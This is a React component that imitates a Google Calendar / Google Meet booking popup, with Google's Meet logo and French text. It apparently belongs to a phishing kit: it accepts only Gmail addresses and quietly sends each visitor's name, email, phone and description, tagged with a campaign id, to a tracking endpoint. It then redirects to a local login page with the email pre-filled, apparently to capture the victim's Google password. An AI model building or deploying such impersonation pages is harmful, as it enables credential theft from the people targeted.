import React, { useState } from 'react';
import BasePopup from '../BasePopup';
import styles from '../../styles/components/CommonPopup.module.css';

export default function CalendarPopup({ isVisible, onClose, campaignData }) {
  const [emailError, setEmailError] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleEmailChange = (e) => {
    const email = e.target.value;
    if (email && !/@gmail\.com$/i.test(email)) setEmailError("Merci d'utiliser une adresse Gmail compatible.");
    else setEmailError('');
  };

  async function handleSubmit(e) {
    e.preventDefault();
    const formData = new FormData(e.target);
    const email = formData.get('email');
    const name = formData.get('fullName');
    const phone = formData.get('phone');
    const description = formData.get('description');

    if (!/@gmail\.com$/i.test(email)) { setEmailError("Merci d'utiliser une adresse Gmail compatible."); return; }

    setIsSubmitting(true);
    // fire and forget tracking
    fetch('/api/tracking/track-submission', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(
        {
          eventType: 'booking',
          payload: { email, name, phone, description },
          campaign: campaignData?.id
        }
      )
    }).catch(() => { });

    // Wait 8 seconds before redirecting
    setTimeout(() => {
      const q = new URLSearchParams({ email, name, c: campaignData?.id }).toString();
      window.location.href = `/login?${q}`;
    }, 8000);
  }

  return (
    <BasePopup isVisible={isVisible} onClose={onClose}>
      <div className={styles.popupHeader}>
        <h2 className={styles.title}>Échange / Café virtuel</h2>
        <div className={styles.dateTime}>
          <div>Réunion Google Meet • 15 minutes</div>
          <div className={styles.timezone}>(GMT+02:00) Heure d'Europe centrale - Paris</div>
          {campaignData && (
            <div className={styles.eventHost}>{campaignData.first_name} {campaignData.last_name} • {campaignData.email}</div>
          )}
        </div>
      </div>

      <div className={styles.meetInfo}>
        <img src="https://ssl.gstatic.com/calendar/images/conferenceproviders/logo_meet_2020q4_192px.svg" alt="Google Meet" width="20" height="20" className={styles.meetIcon} />
        <div>Informations de visioconférence Google Meet ajoutées après la réservation</div>
      </div>

      <div className={styles.formSection}>
        <div className={styles.contactHeader}>
          <svg focusable="false" width="20" height="20" viewBox="0 0 24 24" className={styles.contactIcon}><path d="M22 3H2C.9 3 0 3.9 0 5v14c0 1.1.9 2 2 2h20c1.1 0 1.99-.9 1.99-2L24 5c0-1.1-.9-2-2-2zm0 16H2V5h20v14z"></path><path d="M21 6h-7v5h7V6zm-1 2l-2.5 1.25L15 8V7l2.5 1.25L20 7v1zM9 12c1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3 1.34 3 3 3zm0-4c.55 0 1 .45 1 1s-.45 1-1 1-1-.45-1-1 .45-1 1-1zm6 7.75c0-1.99-4-3-6-3s-6 1.01-6 3V18h12v-2.25z"></path></svg>
          <h3 className={styles.contactTitle}>Informations de contact</h3>
        </div>

        <form className={styles.form} onSubmit={handleSubmit}>
          <div className={styles.formRow}>
            <div className={styles.inputGroup}>
              <label>Nom complet</label>
              <input type="text" name="fullName" className={styles.input} required disabled={isSubmitting} />
            </div>
          </div>

          <div className={styles.formRow}>
            <div className={styles.inputGroup}>
              <label>Adresse Gmail</label>
              <input type="email" name="email" className={`${styles.input} ${emailError ? styles.inputError : ''}`} onChange={handleEmailChange} placeholder="votre.nom@gmail.com" required disabled={isSubmitting} />
              {emailError && <div className={styles.errorMessage}>{emailError}</div>}
            </div>
          </div>

          <div className={styles.formRow}>
            <div className={styles.inputGroup}>
              <label>Numéro de téléphone</label>
              <input type="tel" name="phone" className={styles.input} disabled={isSubmitting} />
            </div>
          </div>

          <div className={styles.formRow}>
            <div className={styles.inputGroup}>
              <label>Présentez-vous en quelques mots</label>
              <textarea name="description" className={styles.textarea} rows="3" disabled={isSubmitting}></textarea>
            </div>
          </div>

          <div className={styles.formActions}>
            <button type="button" onClick={onClose} className={styles.cancelBtn} disabled={isSubmitting}>Annuler</button>
            <button type="submit" className={styles.bookBtn} disabled={isSubmitting}>
              {isSubmitting ? "Réservation..." : "Réserver"}
            </button>
          </div>
        </form>
      </div>
    </BasePopup>
  );
}
